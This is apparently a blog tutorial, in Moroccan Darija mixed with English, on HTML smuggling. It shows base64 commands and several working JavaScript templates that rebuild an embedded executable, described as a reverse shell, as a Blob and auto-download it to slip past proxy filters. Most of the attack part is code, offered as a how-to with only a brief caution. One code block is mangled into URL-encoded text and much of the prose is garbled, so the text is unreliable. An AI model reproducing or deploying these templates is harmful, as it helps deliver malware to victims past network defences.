---
title: File Smuggling with HTML and JavaScript
author: 0xYumeko
date: 2024-01-28 11:31:00 +0700
categories: [File Smuggling with HTML and JavaScript]
tags: [JavaScript, Smuggling, HTML]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/L3ak-CTF/Morocco.png
---


File smuggling hya wahed technique li katkhallik tkhlli files, li kaynin types mnhom .exe li kaynin blocked mn طرف proxy, bikhir. Kan nghir fiha bzaf mn tachrik li katsir mn ma ykhdmch, w l’html w javascript kaynin f had script.

**Bach tkhdam File Smuggling:**

1. **L’HTML w JavaScript:**
    
    - Katchouf l code HTML w JavaScript li kayn fi had technique  kaynin fiha snif li kaykhlli l file install mn b3d ma katsir mn proxy.
    
    - Katdir file li kayn blocked f normal situations  kamma `.exe` w katdkhol l HTML file m3a code li kaykhlli file yzaid ytb9a.
3. **Integration:**
    
    - Katdkhol code fi page li katdkhl file  w had code kaydkhl f page HTML ma kaychoufch proxy.
4. **Testing:**
    
    - Katjarrib had technique bach tkhdam bchkl s7i7. 
    - 
    - **Exemple Simple:**

     L’HTML code:
     
     ````html
     <a href="path/to/your/file.exe" download>Download File</a>
````


****L’JavaScript code (f page HTML):****

```javascript
file://%20tkhlli%20code%20li%20kaykhdam%20mn%20b3d%20maykhllikch%20download%20directfunction%20downloadfile()%20{%20%20%20%20var%20link%20=%20document.createelement('a');%20%20%20%20link.href%20=%20'path/to/your/file.exe';%20%20%20%20link.download%20=%20'file.exe';%20%20%20%20document.body.appendChild(link);%20%20%20%20link.click();%20%20%20%20document.body.removeChild(link);%7DdownloadFile();
``` 

**B’hed tariqa, kaydri li katbghi mn b3d proxy li kayfdol files mn download.**

Kayn chi tabe3 mn `base64` b khtisar . Khassek tkhlli file executable li bghiti tkhlli mn proxy  F had tariqa  t9dr tkhdam l file `.exe` mn base64 bach tkhdmo f l HTML w JavaScript.

**Convert the Executable to Base64:**

- T9dr tkonverti l file executable li bghiti (par exemple `file.exe`) ila base64 b chi tool kayna f system dyalek. 
-

**Command Line:**

```
base64.exe C:\experiments\evil32.exe > .\evil.txt
```

```bash
base64 file.exe > file_base64.txt
```

- Had command ghatdir l’output dyal base64 f file txt (e.g., `file_base64.txt`).

**Integrate the Base64 Data into Your HTML:**

- Katakhod l data li m7soubha f file `.txt` w tkhdam biha f HTML page.

**HTML Code:**

```html
<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = 'payloads';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
```

**3. Explanation:**

- **Conversion to Base64:**
- - - `base64` command tkonverti l file executable ila base64 string.
- **Integration:**
- 
- - - L base64 string katdakhlo f JavaScript w tsir l data binary mn l base64.
    - Katchof l file `.exe` mn l Blob object w katkhdmo f download link li kaykhlli file download mn browser.
    

**B hed tariqa, katkonverti l file executable l base64 w tkhdmo f HTML page, w had technique kaykhlli tkhdam mn b3d proxy li kayfdol l file types.**

L execution dyal file smuggling f HTML page, kanqsu l exemple li kayn f Internet Explorer (ou même Chrome). Had tariqa katkhllik tkhlli executable file ytb9a mn b3d ma katdir l download.

**1. Opening the HTML File:**

- **F Internet Explorer / Chrome:**
    - F chi browser  f klik 3la button li kaykhdam download  kaykhdmo mn script li kaychouf l file mn base64, w kaydwi l download dyal file.

**2. Run/Download Prompt:**

- **Prompt:**
    - Browser ghadi y3ti prompt li kaydwi  Run (ou Save). F had case, katklik Run bach tsir l executable file.


**3. Execution of the Executable:**

- **After Download:**
    - Mn b3d ma tdkhl l file ghadi ykhdam mn download w kaykhlli chi shell (command line) b zaf mn l process.

**Shell Popped:**

- F had case  shell katkhlli tkhdam mn b3d ma tdkhl l file, w had shell ghadi ykhdam mn l executable file.

**4. Risks and Considerations:**

- **Security Risks:**
    
    - Had technique kaymkin tkhdam f chi situations li kaykhdmo mn proxy w kanb9aw f risk dyal security.
    - B kaykhdam chi code w files li m arefch tdir lsecurity risks.
- **Browser Behavior:**
    
    - Different browsers kaykhdmo b sora different mn had technique. Chi browsers kaykonfiqay l safety mechanisms li kayhdmo mn security threats.

**Important Note:**

- T hzab b had techniques f chi context m7ddad w kaifach tdir t9dir tram3. Tchouf l security implications w kayn chi tools li kaytkhdam mn web security testing.

**Exemple de Code:**

```html
<html>
<body>
    <button onclick="downloadFile()">Download File</button>
    <script>
        function downloadFile() {
            var base64Data = 'base64_encoded_data_here'; // Replace with your base64 data
            var binaryString = window.atob(base64Data);
            var len = binaryString.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            var blob = new Blob([bytes], { type: 'application/octet-stream' });
            var link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = 'file.exe';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>

```

Had tariqa katkhlli executable file ytb9a mn proxy w kaymkin l user ykhdam file mn browser  kamma ghadi tkhdam mn download w run.
